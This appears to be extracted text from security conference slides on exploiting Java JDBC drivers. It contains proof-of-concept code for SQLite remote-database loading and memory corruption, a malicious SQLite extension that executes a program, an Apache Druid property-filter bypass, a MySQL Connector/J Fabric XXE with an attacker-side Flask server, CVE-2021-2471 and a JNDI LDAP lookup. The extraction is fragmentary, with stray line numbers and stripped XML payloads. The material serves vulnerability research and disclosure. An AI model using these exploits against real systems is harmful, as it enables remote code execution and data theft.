if (!deletionSucceeded) {
throw new IOException("failed to remove existing DB file: " + 
dbFile.getAbsolutePath());
}
}
}
byte[] buffer = new byte[8192]; // 8K buffer
FileOutputStream writer = new FileOutputStream(dbFile);
InputStream reader = resourceAddr.openStream();
try {
int bytesRead = 0;
while ((bytesRead = reader.read(buffer)) != -1) {
writer.write(buffer, 0, bytesRead);
}
return dbFile;
}
finally {
writer.close();
reader.close();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
Controllable SQLite DB & Uncontrollable select code
Class.forName("org.sqlite.JDBC");
c=DriverManager.getConnection(url);
c.setAutoCommit(true);
Statement statement = c.createStatement();
statement.execute("SELECT * FROM security");
Utilize "CREATE VIEW" to convert uncontrollable SELECT to controllable
Trigger sub-query-1 and sub-query-2
CREATE VIEW security AS SELECT (), ()
Load extension with a controllable file？
"
protected CoreConnection(String url, String fileName, Properties prop) throws 
SQLException
{
this.url = url;
this.fileName = extractPragmasFromFilename(fileName, prop);
SQLiteConfig config = new SQLiteConfig(prop);
this.dateClass = config.dateClass;
this.dateMultiplier = config.dateMultiplier;
this.dateFormat = FastDateFormat.getInstance(config.dateStringFormat);
this.dateStringFormat = config.dateStringFormat;
this.datePrecision = config.datePrecision;
this.transactionMode = config.getTransactionMode();
this.openModeFlags = config.getOpenModeFlags();
open(openModeFlags, config.busyTimeout);
if (fileName.startsWith("file:") && !fileName.contains("cache="))
{   // URI cache overrides flags
db.shared_cache(config.isEnabledSharedCache());
}
db.enable_load_extension(config.isEnabledLoadExtension());
// set pragmas
config.apply((Connection)this);
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
public class SqliteTest {
public static void main(String args[]) {
Connection c = null;
String url= "jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db";
try {
Class.forName("org.sqlite.JDBC");
c = DriverManager.getConnection(url);
c.setAutoCommit(true);
Statement statement = c.createStatement();
statement.execute("SELECT * FROM security");
} catch (Exception e) {
System.err.println(e.getClass().getName() + ": " + e.getMessage());
System.exit(0);
}
}
}
Use memory corruptions in SQLite such "Magellan"
String[] PoC = {
"DROP TABLE IF EXISTS ft;",
"CREATE VIRTUAL TABLE ft USING fts3;",
"INSERT INTO ft VALUES('aback');",
"INSERT INTO ft VALUES('abaft');",
"INSERT INTO ft VALUES('abandon');",
"SELECT quote(root) from ft_segdir;",
"UPDATE ft_segdir SET root = 
X'0005616261636B03010200FFFFFFFF070266740302020003046E646F6E03030200';",
"CREATE VIEW security as select (SELECT * FROM ft WHERE ft MATCH 'abandon')",
};
Use memory corruptions in SQLite such "Magellan"
#include  /* Do not use ! */
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
SQLITE_EXTENSION_INIT1
#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_extension_init(
char **pzErrMsg,
const sqlite3_api_routines *pApi
){
int rc = SQLITE_OK;
SQLITE_EXTENSION_INIT2(pApi);
(void)pzErrMsg;  /* Unused parameter */
char *argv[]={"open","-a","Calculator",NULL};
rc = execv("/usr/bin/open", argv);
return rc;
}
gcc -fno-common -dynamiclib ./ext.c -o ./ext.so
Write SQLite extension for remote code execution
Complice SQLite extension
Other scenarios
• Cloud native environment
• New gadgets (jackson/fastjson)
• Attack SpringBoot Actuator misconfiguration
• API interfaces exposure
• Phishing or honeypot
H2 supports "EXECUTE" statements like Postgre()
case 'E':
if (readIf("EXPLAIN")) {
c = parseExplain();
} else if (database.getMode().getEnum() != ModeEnum.MSSQLServer) {
if(readIf("EXECUTE")) {
c = parseExecutePostgre();
}
} else {
if (readIf("EXEC") || readIf("EXECUTE")）{
c = parseExecutesQLServer();
}
}
break;
case 'G':
if (readIf("GRANT")) {
c = parseGrantRevoke(CommandInterface.GRANT);
}
break;
private Prepared parseExecutePostgre() {
if (readIf("IMMEDIATE")) {
return new ExecuteImmediate(session, readExpression());
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
Properties filter for bug fix
Apache Druid CVE-2021-26919 patch
public static void throwIfPropertiesAreNotAllowed(
Set actualProperties,
Set systemPropertyPrefixes,
Set allowedProperties
)
{
for (String property : actualProperties) {
if
(systemPropertyPrefixes.stream().noneMatch(property::startsWith)) {
Preconditions.checkArgument(
allowedProperties.contains(property),
"The property [%s] is not in the allowed list %s",
property, allowedProperties
);
}
}
}
Apache DolphinScheduler CVE-2020-11974 Patch
private final Logger logger = LoggerFactory.getLogger(MySQLDataSource.class);
private final String sensitiveParam = "autoDeserialize=true";
private final char symbol = '&';
/**
* gets the JDBC url for the data source connection
* @return jdbc url
return DbType.MYSQL;
}
@Override
protected String filterOther(String other){
if (other.contains(sensitiveParam)){
int index = other.indexOf(sensitiveParam);
String tmp = sensitiveParam;
if (other.charAt(index-1) == symbol){
tmp = symbol + tmp;
} else if(other.charAt(index + 1) == symbol){
tmp = tmp + symbol;
}
logger.warn("sensitive param : {} in otherParams field is filtered", tmp);
other = other.replace(tmp, "");
}
New exploitable way to bypass property filter
Apache Druid 0day case
• MySQL connector/J 5.1.48 is used
• Effect Apache Druid latest version
• Differences between properties filter parser and JDBC driver parser
Apache Druid 0day case
private static void checkConnectionURL(String url, JdbcAccessSecurityConfig securityConfig)
{
Preconditions.checkNotNull(url, "connectorConfig.connectURI");
if (!securityConfig.isEnforceAllowedProperties()) {
// You don't want to do anything with properties.
return;
}
@Nullable final Properties properties; // null when url has an invalid format
if (url.startsWith(ConnectionUriUtils.MYSQL_PREFIX)) {
try {
NonRegisteringDriver driver = new NonRegisteringDriver();
properties = driver.parseURL(url, null);
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
Java Service Provider Interface
java.util.ServiceLoader
com.mysql.fabric.jdbc.FabricMySQLDriver
mysql-connector-java-{VERSION}.jar
META-INF/services
java.sql.Driver
com.mysql.cj.jdbc.Driver
com.mysql.fabric.jdbc.FabricMySQLDriver
• MySQL Fabric is a system for managing a farm of MySQL servers.
• MySQL Fabric provides an extensible and easy to use system for managing a 
MySQL deployment for sharding and high-availability.
Properties parseFabricURL(String url, Properties defaults) throws SQLException
{
if (!url.startsWith("jdbc:mysql:fabric://")) {
return null;
}
// We have to fudge the URL here to get NonRegisteringDriver.parseURL() 
to parse it for us.
// It actually checks the prefix and bails if it's not recognized.
// jdbc:mysql:fabric:// => jdbc:mysql://
return super.parseURL(url.replaceAll("fabric:", ""), defaults);
}
1
2
3
4
5
6
7
8
9
10
11
customize fabric protocol
send a XMLRPC request to host
try {
String url = this.fabricProtocol + "://" + this.host + ":" + this.port;
this.fabricConnection = new FabricConnection(url, this.fabricUsername, 
this.fabricPassword);
} catch (FabricCommunicationException ex) {
throw SQLError.createSQLException("Unable to establish connection to the Fabric 
server", SQLError.SQL_STATE_CONNECTION_REJECTED, ex, getExceptionInterceptor(), this);
}
public FabricConnection(String url, String username, String password) throw
FabricCommunicationException {
this.client = new XmlRpcClient(url, username, password);
refreshState();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
Call XMLRPC request automatically after JDBC connection
Does it seem like a SSRF request?
public FabricConnection(String url, String username, String password) throws 
FabricCommunicationException {
this.client = new XmlRpcClient(url, username, password);
refreshState();
}
. . . . . .
public int refreshState() throws FabricCommunicationException {
FabricStateResponse> serverGroups = this.client.getServerGroups();
FabricStateResponse> shardMappings = this.client.getShardMappings();
this.serverGroupsExpiration = serverGroups.getExpireTimeMillis();
this.serverGroupsTtl = serverGroups.getTtl();
for (ServerGroup g : serverGroups.getData()) {
this.serverGroupsByName.put(g.getName(), g);
}
. . . . . .
public FabricStateResponse> getServerGroups(String groupPattern) throws
FabricCommunicationException {
int version = 0; // necessary but unused
Response response = errorSafeCallMethod(METHOD_DUMP_SERVERS, new Object[] { version, 
groupPattern });
// collect all servers by group name
Map> serversByGroupName = new HashMap>();
. . . . . . 
private Response errorSafeCallMethod(String methodName, Object args[]) throws 
FabricCommunicationException {
List responseData = this.methodCaller.call(methodName, args);
Response response = new Response(responseData);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
set evil JDBC URL
porcess XML external entity
initiate XMLRPC request
Server
Attacker
retrieve data in response
Find XXE vulnerability in processing response data
OutputStream os = connection.getOutputStream();
os.write(out.getBytes());
os.flush();
os.close();
// Get Response
InputStream is = connection.getInputStream();
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
ResponseParser saxp = new ResponseParser();
parser.parse(is, saxp);
is.close();
MethodResponse resp = saxp.getMethodResponse();
if (resp.getFault() != null) {
throw new MySQLFabricException(resp.getFault());
}
return resp;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
XXE attack without any properties
import java.sql.Connection;
import java.sql.DriverManager;
public class MysqlTest{
public static void main(String[] args) throws Exception{
String url = "jdbc:mysql:fabric://127.0.0.1:5000";
Connection conn = DriverManager.getConnection(url);
}
}
from flask import Flask
app = Flask(__name__) 
@app.route('/xxe.dtd', methods=['GET', 'POST'])
def xxe_oob():
return '''
"> %demo;'''
@app.route('/', methods=['GET', 'POST'])
def dtd():
return '''
 %xd;]>
&bbbb;'''
if __name__ == '__main__'
app.run()
XXE attack without any properties
public  T getSource(Class clazz) throws SQLException {
checkClosed();
checkWorkingWithResult();
// Note that we try and use streams here wherever possible for the day that the server actually 
supports streaming from server -> client
// (futureproofing)
if (clazz == null || clazz.equals(SAXSource.class)) {
InputSource inputSource = null;
if (this.fromResultSet) {
inputSource = new 
InputSource(this.owningResultSet.getCharacterStream(this.columnIndexOfXml));
} else {
inputSource = new InputSource(new StringReader(this.stringRep));
}
return (T) new SAXSource(inputSource);
} else if (clazz.equals(DOMSource.class)) {
try {
DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
builderFactory.setNamespaceAware(true);
DocumentBuilder builder = builderFactory.newDocumentBuilder();
InputSource inputSource = null;
MySQL Connector/J XXE CVE-2021-2471
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
@Override
public synchronized void setString(String str) throws SQLException {
checkClosed();
checkWorkingWithResult();
this.stringRep = str;
this.fromResultSet = false;
}
MySQL Connector/J XXE CVE-2021-2471
1
2
3
4
5
6
7
8
import com.mysql.cj.jdbc.MysqlSQLXML;
import javax.xml.transform.dom.DOMSource;
import java.sql.SQLException;
public class MySQLDemo {
public static void main(String[] args) throws SQLException {
MysqlSQLXML myXML = new MysqlSQLXML(null);
myXML.setString("" +
"%aaa;%ccc;%ddd;]>");
myXML.getSource(DOMSource.class);
}
}
Python wrapper of JDBC in Jython
• JDBC is the standard platform for database access in Java
• DBI is the standard database API for Python applications
zxJDBC, part of Jython, provides a DBI 2.0 standard compliant interface to JDBC.
zxJDBC.lookup()
import org.python.util.PythonInterpreter;
public class JndiDemo {
public static void main(String[] args) {
PythonInterpreter pyInter = new PythonInterpreter();
pyInter.exec("from com.ziclix.python.sql import zxJDBC;" +
"zxJDBC.lookup(\"ldap://127.0.0.1:1389/ijf2bp\")");
}
}